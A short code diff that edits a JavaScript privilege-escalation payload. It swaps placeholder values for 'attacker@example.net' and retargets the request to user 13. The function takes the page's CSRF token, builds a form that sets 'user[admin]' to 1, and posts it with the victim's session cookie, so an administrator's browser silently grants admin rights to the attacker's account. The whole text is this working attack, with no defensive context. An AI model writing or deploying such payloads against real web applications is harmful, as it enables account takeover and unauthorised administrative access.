@@ -11,10 +11,10 @@ async function escalatePrivileges() {
   const body = new URLSearchParams({
     _method: "put",
     authenticity_token: csrf,
-    "user[login]": "test@test.com",
-    "user[firstname]": "test",
-    "user[lastname]": "test",
-    "user[mail]": "test@test.com",
+    "user[login]": "attacker@example.net",
+    "user[firstname]": "attacker",
+    "user[lastname]": "attacker",
+    "user[mail]": "attacker@example.net",
     "user[language]": "en",
     "user[admin]": "1",
     "user[password]": "",
@@ -27,9 +27,9 @@ async function escalatePrivileges() {
     button: "",
   });
 
-  await fetch(`/users/5`, {
+  await fetch(`/users/13`, {
     method: "POST",
-    credentials: "include", // send session cookie
+    credentials: "include", 
     headers: {
       "Content-Type": "application/x-www-form-urlencoded",
       Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -39,4 +39,5 @@ async function escalatePrivileges() {
 }
 
 escalatePrivileges();
+
 
